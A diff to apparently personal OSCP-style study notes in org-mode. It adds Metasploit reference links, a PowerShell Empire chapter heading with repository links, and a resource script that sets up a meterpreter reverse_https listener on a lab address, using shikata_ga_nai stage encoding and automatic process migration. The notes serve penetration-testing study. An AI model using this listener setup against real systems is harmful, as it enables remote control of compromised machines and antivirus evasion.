@@ -2469,6 +2469,9 @@ In production environments, domains typically have more than one domain controll
       - merit: gain pw hashes *without logging in to the DC* .
 
 * Book3_Chapter 22 The Metasploit Framework
+** Extra References: 
+   + ref:
+     - [[https://www.offensive-security.com/metasploit-unleashed/Using_the_Database]]
 ** Exam Restrictions
    + ref:
      - [[https://help.offensive-security.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide][Metasploit Restrictions]]
@@ -2894,7 +2897,28 @@ rdesktop 127.0.0.1
     #+end_src
     
 ** Metasploit Automation
-
+   + src:
+   #+begin_src msf
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_https
+set LHOST 10.11.0.4
+set LPORT 443
+set EnableStageEncoding true
+set StageEncoder x86/shikata_ga_nai
+set AutoRunScript post/windows/manage/migrate
+set ExitOnSession false
+run -j -z
+   #+end_src
+   #+begin_src bash
+sudo msfconsole -r setup.rc
+  # run script
+   #+end_src
+   
+   
+* Book3_Chapter 23 PowerShell Empire
+** project repo && latest forks:
+   + [[https://github.com/EmpireProject/Empire]]
+   + [[https://github.com/Jrhenderson11/Empire]]
 
 
 * TODO list
